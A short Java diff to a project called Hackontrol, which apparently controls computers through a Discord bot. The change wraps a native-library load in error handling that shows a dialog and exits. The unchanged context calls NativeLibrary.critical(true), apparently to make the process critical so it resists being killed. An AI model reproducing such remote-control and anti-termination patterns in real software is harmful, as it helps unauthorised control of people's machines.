@@ -21,6 +21,7 @@ import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
 import com.khopan.hackontrol.registry.implementation.RegistryImplementation;
 import com.khopan.hackontrol.utils.ErrorHandler;
+import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.logger.hackontrol.HackontrolLoggerConfig;
 
 import net.dv8tion.jda.api.JDA;
@@ -256,7 +257,14 @@ public class Hackontrol {
 			return;
 		}
 
-		System.load(pathFileLibnative32.getAbsolutePath());
+		try {
+			System.load(pathFileLibnative32.getAbsolutePath());
+		} catch(Throwable Errors) {
+			JOptionPane.showMessageDialog(null, HackontrolError.getMessage(Errors), "Error", JOptionPane.ERROR_MESSAGE);
+			System.exit(1);
+			return;
+		}
+
 		NativeLibrary.critical(true);
 		HackontrolLoggerConfig.disableDebug();
 		Hackontrol.LOGGER.info("Initializing");
